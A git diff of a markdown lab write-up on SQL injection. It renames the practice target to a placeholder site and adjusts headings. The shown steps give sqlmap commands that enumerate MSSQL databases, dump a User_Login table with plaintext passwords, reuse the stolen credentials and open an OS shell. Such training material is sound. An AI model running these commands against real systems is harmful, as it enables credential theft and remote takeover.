@@ -29,13 +29,13 @@
 
 ---
 
-## Tasks
+##### Tasks
 
 #### 1. Perform SQL Injection Attacks
    - Perform SQL injection Attacks on an MSSQL Database
    - Perform SQL injection Attack against MSSQL to extract database using sqlmap 
 
-### 2. Detect SQL vulnerabilities using Various SQL injection detection tools
+#### 2. Detect SQL vulnerabilities using Various SQL injection detection tools
    - Detect SQL vulnerabilities using DSSS 
    - Detect SQL vulnerabilities using OWASP ZAP
 
@@ -67,7 +67,7 @@
 
 - We can utilize [sqlmap](https://www.kali.org/tools/sqlmap/), an open-source penetration testing tool, to automate the detection and exploitation of SQL injection flaws in MSSQL.
 
-- Open Mozilla Firefox and navigate to http://www.moviescope.com/
+- Open Mozilla Firefox and navigate to e.g., http://www.vulnerablewebsite.com/
 - Create one account and login.
 - Navigate to the View Profile tab, and note the URL in the address bar.
 - Right-click on the webpage, select Inspect Element, and open the Console tab.
@@ -75,25 +75,25 @@
 
 - Run sqlmap with the following command:
     ```bash
-    sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=l" --cookie="[copied cookie value]" --dbs
+    sqlmap -u "http://www.vulnerablewebsite.com/viewprofile.aspx?id=l" --cookie="[copied cookie value]" --dbs
     ```
 
-- Upon success, sqlmap will display information about MSSQL databases on the MovieScope website.
+- Upon success, sqlmap will display information about MSSQL databases on the VulnerableWebsite website.
 - Choose a database and retrieve its tables with the command:
     ```bash
-    sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=l" --cookie="[copied cookie value]" -D moviescope --tables
+    sqlmap -u "http://www.vulnerablewebsite.com/viewprofile.aspx?id=l" --cookie="[copied cookie value]" -D vulnerabledatabase --tables
     ```
 
 - Dump the contents of the User_Login table:
     ```bash
-    sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=l" --cookie="[copied cookie value]" -D moviescope -T User_Login --dump
+    sqlmap -u "http://www.vulnerablewebsite.com/viewprofile.aspx?id=l" --cookie="[copied cookie value]" -D vulnerabledatabase -T User_Login --dump
     ```
 
 - Review the retrieved user information, including usernames and plaintext passwords.
 - Verify the login credentials by logging in with a user's details.
 - Obtain an OS shell using:
     ```bash
-    sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=l" --cookie="[copied cookie value]" --os-shell
+    sqlmap -u "http://www.vulnerablewebsite.com/viewprofile.aspx?id=l" --cookie="[copied cookie value]" --os-shell
     ```
 
 - Follow the prompts to optimize DBMS delay responses and retrieve the hostname of the target machine.
